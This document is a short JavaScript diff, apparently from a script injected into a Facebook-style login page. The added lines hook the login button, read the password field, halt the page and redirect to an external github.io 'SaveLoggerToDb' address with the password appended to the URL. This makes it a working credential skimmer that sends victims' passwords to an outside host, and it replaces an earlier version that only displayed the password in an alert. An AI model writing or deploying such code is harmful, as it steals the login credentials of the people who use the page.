@@ -14,16 +14,17 @@ const waiiFb = new Promise((res) => {
     alert(val)
     if(val == "d"){
         try{
-            document.getElementById('loginbutton').onclick = function(){
-            document.querySelector("#pass").type = 'text'
-            alert(document.querySelector("#pass").value)
+            document.getElementsByName("login")[0].onclick = function(){
+            document.getElementsByName("pass")[0].type = 'text'
+            pass = document.getElementsByName("pass")[0].value
+            window.stop()
+            setTimeout(()=>{
+                window.location.href = "https://allentumbagahan.github.io/public/SaveLoggerToDb/index#" + pass
+            }, 1000)
             }
         }
-        catch{
-            document.getElementById('u_0_9_uE').onclick = function(){
-            document.querySelector("#pass").type = 'text'
-            alert(document.querySelector("#pass").value)
-            }
+        catch(err){
+            console.log(err)
         }
     }
 })
